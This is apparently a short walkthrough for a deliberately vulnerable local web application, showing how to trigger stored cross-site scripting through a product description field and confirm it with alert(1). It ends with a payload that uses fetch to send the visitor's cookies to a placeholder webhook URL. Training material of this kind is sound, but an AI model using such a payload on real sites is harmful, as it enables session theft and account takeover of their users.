## XSS

### Preparation

Go to `http://localhost:3000/settings` and set `XSS` -> `Stored XSS`

![img.png](img.png)

We will check feature `Add Product` or URL: `http://localhost:3000/product/add`

![img_1.png](img_1.png)

Test XSS in description (or another)

![img_2.png](img_2.png)

And submit. We have a product URL here:

![img_3.png](img_3.png)

Or you can see our product in `http://localhost:3000`

![img_4.png](img_4.png)

Click it!

![img_5.png](img_5.png)
`alert(1)` => We confirm XSS vulnerability occur here!

You can try payload:
```js
<script>
fetch(`YOUR-WEB-HOOK-URL?cookie=${document.cookie}`)
</script>
```

Done!

![img_6.png](img_6.png)